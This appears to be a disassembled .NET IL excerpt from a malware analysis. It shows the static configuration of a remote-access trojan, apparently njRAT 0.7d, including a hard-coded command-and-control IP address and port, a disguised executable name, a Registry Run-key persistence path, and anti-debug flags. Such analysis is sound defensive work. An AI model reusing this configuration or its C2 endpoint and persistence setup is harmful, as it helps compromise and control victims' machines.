0x20 ldc.i4						0x1401
0x8D newarr 					mscorlib]System.Byte
0x80 stsfld 					uint8[] j.OK::TaskBuffer?
0x72 ldstr 						"False"
0x28 call 						bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
0x80 stsfld 					bool j.OK::Thread_Debug?
0x14 ldnull 					
0x80 stsfld 					class [System]System.Net.Sockets.TcpClient j.OK::C
0x16 ldc.i4.0
0x80 stsfld 					bool j.OK::Connect_Back_to_C2
0x72 ldstr 						"TEMP"
0x80 stsfld 					string j.OK::Executable_Directory
0x72 ldstr 						"WindowsServices.exe"
0x80 stsfld 					string j.OK::Executable_Name
0x73 newobj 					instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
0x80 stsfld 					class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
0x72 ldstr 						"81.23.151.222"
0x80 stsfld 					string j.OK::HostAddr
0x72 ldstr 						"False"
0x28 call 						bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
0x80 stsfld 					bool j.OK::Idr
0x72 ldstr 						"False"
0x28 call 						bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
0x80 stsfld 					bool j.OK::Anti_Debug_Process_Check
0x72 ldstr 						"False"
0x28 call 						bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
0x80 stsfld 					bool j.OK::StartupPersistence_Option
0x72 ldstr 						"False"
0x28 call 						bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
0x80 stsfld 					bool j.OK::ProgramFiles_Persistance?
0x72 ldstr 						"False"
0x28 call 						bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
0x80 stsfld 					bool j.OK::Persistence_Option
0x14 ldnull 					
0x80 stsfld 					j.kl j.OK::kq
0x72 ldstr 						""
0x80 stsfld 					j.OK::lastcap
0x28 call 						class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
0x28 callvirt 					instance string [mscorlib]System.Reflection.Assembly::get_Location()
0x73 newobj 					void [mscorlib]System.IO.FileInfo::.ctor(string)
0x80 stsfld 					mscorlib]System.IO.FileInfo j.OK::Current_File_Info
0x73 newobj 					instance void [mscorlib]System.IO.MemoryStream::.ctor()
0x80 stsfld 					mscorlib]System.IO.MemoryStream j.OK::MeM
0x14 ldnull 					
0x80 stsfld 					j.OK::MT
0x72 ldstr 						"352"
0x80 stsfld 					j.OK::Port?
0x14 ldnull 					
0x80 stsfld 					j.OK::PLG
0x72 ldstr 						"cced8f41daef86542c6eaefd81723d42"
0x80 stsfld 					j.OK::Persistence_KeyName
0x72 ldstr 						"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
0x80 stsfld 					j.OK::'CurrentVersion\\Run_String'
0x72 ldstr 						"VGVzdDE="
0x80 stsfld 					j.OK::VN
0x72 ldstr 						"0.7d"
0x80 stsfld 					string j.OK::VR
0x72 ldstr 						"Y262SUCZ4UJJ"
0x80 stsfld 					string j.OK::Malware_ID?
0x2A ret 					
